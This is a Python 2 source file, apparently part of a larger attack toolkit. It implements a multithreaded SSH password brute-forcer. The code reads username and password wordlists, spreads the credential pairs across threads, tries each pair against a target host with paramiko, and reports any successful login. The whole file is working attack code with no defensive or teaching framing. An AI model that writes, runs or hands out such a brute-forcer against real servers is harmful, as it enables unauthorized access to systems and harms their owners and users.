# -*- coding: utf-8 -*-

"""
 * Copyright(C) Anyuntec 2017.
 *
 * ssh攻击
 *
 * @author margin 2017/02/17.
 *
 * @version V1.00.
 *
 * 更新履历： V1.00 2017/02/17 margin 创建.
 *
 """
from AttackBase import AttackBase
from AttackObject import AttackObject
import threading,traceback,Queue,paramiko

class SSHAttack(AttackBase):

    def __init__(self,attackOjbect):
        super(SSHAttack, self).__init__(attackOjbect)
    """
    SSH爆破类
    """
    def attack(self):
        result = {"status":True,"msg":"正在破解"}
        try:
            self.attackOjbect.usernames = "/Users/margin/PycharmProjects/SQLMap/SQLMapUI/attack/username.txt"
            self.attackOjbect.passwords = "/Users/margin/PycharmProjects/SQLMap/SQLMapUI/attack/password.txt"
            threads = self.attackOjbect.getThreads()
            attack_queue_result = self.attack_queue()
            if attack_queue_result["status"]:
                self.attackOjbect.attack_queue = attack_queue_result["data"]
            else:
                return attack_queue_result
            for index in range(0,threads):
                attacker = Attacker(self.attackOjbect)
                attacker.start()
        except Exception:
            print traceback.format_exc()
            result = {"status":False,"msg":traceback.format_exc()}
            return result

class Attacker(threading.Thread):
    """
    SSH爆破类
    """
    attackObject = AttackObject()
    def __init__(self,attackObject):
        #注意：一定要显式的调用父类的初始化函数。
        super(Attacker, self).__init__()
        self.attackObject = attackObject

    def run(self):
        ip_ = self.attackObject.getIp()
        port_ = self.attackObject.getPort()
        attack_queue = self.attackObject.getAttack_queue()
        while attack_queue.empty() is False:
            up_ = self.attackObject.getAttack_queue().get()
            username_ = up_[0]
            password_ = up_[1]
            print self.getName() + ":" + username_ + ":" + password_
            if self.connect(ip_,username_,password_):
                print "破解成功%s:%s" % (username_,password_)
                # 清空队列
                self.attackObject.attack_queue.queue.clear()

    def connect(self,host,username,password):
        try:
            ssh=paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host,username=username,password=password,timeout=5)
            ssh.close()
            return True
        except:
            return False